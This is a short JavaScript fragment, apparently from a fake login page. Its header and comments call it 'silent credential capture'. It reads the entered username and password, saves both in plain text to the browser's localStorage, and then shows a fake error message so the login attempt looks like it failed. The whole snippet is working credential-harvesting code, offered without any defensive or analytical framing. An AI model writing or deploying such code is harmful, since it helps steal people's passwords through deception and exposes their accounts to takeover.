// Silent credential capture - v2
function checkLogin() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Store username and password in localStorage silently
    if (username && password) {
      localStorage.setItem("storedUsername", username);
      localStorage.setItem("storedPassword", password);
      
      // Show the error message (fake error to make it look real)
      var errorElement = document.getElementById("error-message");
      if (errorElement) {
        errorElement.style.display = "flex";
      }
    } else {
      alert("Please enter both username and password.");
    }
  }